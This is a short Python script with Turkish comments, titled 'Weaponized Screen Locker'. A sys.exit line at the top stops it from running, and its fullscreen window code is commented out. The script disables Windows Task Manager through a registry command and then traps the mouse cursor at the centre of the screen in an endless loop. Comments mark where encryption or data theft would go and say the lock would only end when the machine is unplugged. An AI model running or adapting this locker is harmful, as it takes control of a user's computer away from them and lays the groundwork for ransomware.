import sys
import os
import pyautogui
# import tkinter as tk

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod ekranı kilitler ve kullanıcıyı engeller.")

print("--- WEAPONIZED SCREEN LOCKER ---")

def lock_system():
    # 1. GÖREV YÖNETİCİSİNİ KAPAT (Weaponized Part)
    print("[*] Task Manager devre dışı bırakılıyor...")
    os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    
    # 2. KİLİTLEME DÖNGÜSÜ
    # root = tk.Tk()
    # root.attributes("-fullscreen", True)
    # root.protocol("WM_DELETE_WINDOW", lambda: None) # Alt+F4 İptal
    
    print("[!] Ekran kilitlendi. Fare hapsediliyor...")
    
    try:
        while True:
            # Fareyi sürekli ekranın ortasına çek (Mouse Trap)
            pyautogui.moveTo(960, 540)
            
            # (Arka planda şifreleme veya veri çalma işlemi burada yapılır)
            
    except KeyboardInterrupt:
        # Gerçekte bu blok olmaz, PC fişten çekilene kadar durmaz.
        pass

if __name__ == "__main__":
    lock_system()